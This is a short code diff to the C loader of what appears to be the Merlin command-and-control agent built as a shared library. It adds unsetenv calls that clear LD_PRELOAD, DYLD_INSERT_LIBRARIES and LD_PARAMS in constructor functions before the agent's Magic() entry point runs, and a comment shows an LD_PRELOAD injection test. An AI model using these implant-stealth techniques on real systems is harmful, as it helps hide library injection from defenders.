@@ -46,11 +46,16 @@ BOOL WINAPI DllMain(
 // Test SO execution
 // LD_PRELOAD=/home/rastley/Downloads/merlin.so /usr/bin/whoami
 
+#include <stdlib.h>
+
 void Magic();
 
 static void __attribute__ ((constructor)) init(void);
 
 static void init(void) {
+   // Thanks to the Sliver team for the unsetenv reminder
+    unsetenv("LD_PRELOAD");
+    unsetenv("LD_PARAMS");
   // Magic is the exported function from shared.go
   Magic();
   return;
@@ -74,6 +79,10 @@ void Magic();
 
 __attribute__ ((constructor)) void initializer()
 {
+    // Thanks to the Sliver team for the unsetenv reminder
+    unsetenv("DYLD_INSERT_LIBRARIES");
+    unsetenv("LD_PARAMS");
+
 	pthread_attr_t  attr;
     pthread_t       posixThreadID;
     int             returnVal;
